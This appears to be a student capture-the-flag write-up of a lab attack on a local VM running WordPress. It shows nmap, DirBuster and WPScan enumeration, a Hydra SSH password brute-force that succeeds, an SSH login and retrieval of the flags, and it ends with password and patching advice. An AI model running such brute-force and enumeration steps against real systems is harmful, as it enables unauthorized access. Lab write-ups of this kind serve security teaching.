# Project-3

## Contents
### Exposed Services
### Exploitation
### Vulnerability Summary

**nmap -A -v -T4 -Pn 192.168.1.110** was run to give the following results.

![nmapscanp3](https://user-images.githubusercontent.com/84904417/128713951-338c8f11-330f-4e93-94ea-19239ca6e180.png)
![nmapscan2p3](https://user-images.githubusercontent.com/84904417/128713989-a6b44a71-90e4-4953-8f5e-4a6141242a95.png)
![nmapscan3p3](https://user-images.githubusercontent.com/84904417/128714022-6ed4ce7b-8389-40b6-8ca8-7dac0dde6b7d.png)

# Exploitation - Flag 1
flag1{b9bbcb33e11b80be759c4e844862482d}

We used Dirbuster to find the /services.html page, the flag was found in the page cource code.

```
root@Kali:~# dirbuster 
Pickedup_JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Aug 03, 2021 2:49:55 AM java.util.prefs.FileSystemPreferences$1 run
INFO: Created user preferences directory.
Starting OWASP DirBuster 1.0-RC1
Starting dir/file list based brute forcing
File found: /.hta.php - 403
File found: /.htaccess.php - 403
File found: /.htpasswd.php - 403
Dir found: / - 200
Dir found: /.hta/ - 403
Dir found: /.htaccess/ - 403
Dir found: /.htpasswd/ - 403
File found: /index.html - 200
File found: /about.html - 200
File found: /service.html - 200
```

# Exploitation - Flag 2
flag2{fc3fd58dcdad9ab23faca6e9a36e581c

Finding the first flag allowed us to discover that wordpress was hosted. This then lead us to exploit the application to find flag 2.

```
[32m[+] [0m URL: http://192.168.1.110/wordpress/
 [32m[+] [0m Started: Mon Aug  2 03:40:57 2021

Interesting Finding(s):

 [32m[+] [0m http://192.168.1.110/wordpress/
 | Interesting Entry: Server: Apache/2.4.10 (Debian)
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

 [32m[+] [0m http://192.168.1.110/wordpress/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access

 [32m[+] [0m http://192.168.1.110/wordpress/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

 [32m[+] [0m http://192.168.1.110/wordpress/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

 [32m[+] [0m WordPress version 4.8.7 identified (Insecure, released on 2018-07-05).
 | Found By: Emoji Settings (Passive Detection)
 |  - http://192.168.1.110/wordpress/, Match: 'wp-includes\/js\/wp-emoji-release.min.js?ver=4.8.7'
 | Confirmed By: Meta Generator (Passive Detection)
 |  - http://192.168.1.110/wordpress/, Match: 'WordPress 4.8.7'

 [34m[i] [0m The main theme could not be detected.


 [34m[i] [0m User(s) Identified:

 [32m[+] [0m steven
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

 [32m[+] [0m michael
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

 [33m[!] [0m No WPVulnDB API Token given, as a result vulnerability data has not been output.
 [33m[!] [0m You can get a free API token with 50 daily requests by registering at https://wpvulndb.com/users/sign_up

 [32m[+] [0m Finished: Mon Aug  2 03:40:59 2021
 [32m[+] [0m Requests Done: 17
 [32m[+] [0m Cached Requests: 35
 [32m[+] [0m Data Sent: 3.757 KB
 [32m[+] [0m Data Received: 12.015 KB
 [32m[+] [0m Memory used: 119.039 MB
 [32m[+] [0m Elapsed time: 00:00:01
wpscan.txt
Displaying wpscan.txt.
```

**Steven** and **Michael** were identified as two usernames on the server. Hydra was then used to brute force Michaels password.

```
root@Kali:~# hydra -l michael -P michaelwordlist.txt 192.168.1.110 -t 4 ssh -V
Hydra v9.0 (c) 2019 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-08-06 21:53:32
[DATA] max 3 tasks per 1 server, overall 3 tasks, 3 login tries (l:1/p:3), ~1 try per task
[DATA] attacking ssh://192.168.1.110:22/
[ATTEMPT] target 192.168.1.110 - login "michael" - pass "MICHAEL" - 1 of 3 [child 0] (0/0)
[ATTEMPT] target 192.168.1.110 - login "michael" - pass "michael" - 2 of 3 [child 1] (0/0)
[ATTEMPT] target 192.168.1.110 - login "michael" - pass "Michael" - 3 of 3 [child 2] (0/0)
[22][ssh] host: 192.168.1.110   login: michael   password: michael
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-08-06 21:53:35
```

Michaels password was his own name. On finding the pair we used his credentials to ssh into the server.

```
root@Kali:~# ssh michael@192.168.1.110
michael@192.168.1.110's password: 

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have mail.
Last login: Tue Aug  3 16:38:01 2021 from 192.168.1.90
michael@target1:~$ 
```

The **find** command was then used to locate flag 2.

```
michael@target1:~$ find / -type f -name flag2.txt -print 2>/dev/null
/var/www/flag2.txt
michael@target1:~$ cat /var/www/flag2.txt 
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
```

## Vulnerabilities

There are many vulneribilties present on the target 1 VM. The ones exploited here relate to weak passwords and insecure appications. To be secure passwords must be complex, ideally a combination of letters, numbers and symbols. Changing them regularly is also recommended. This breach may have been stopped in the early stages had Michael's password been complex as brute force would have been unlikely to return a match. Wordpress was vulnerable to exploitation here because it wasn't updated, which is another essential security task.  
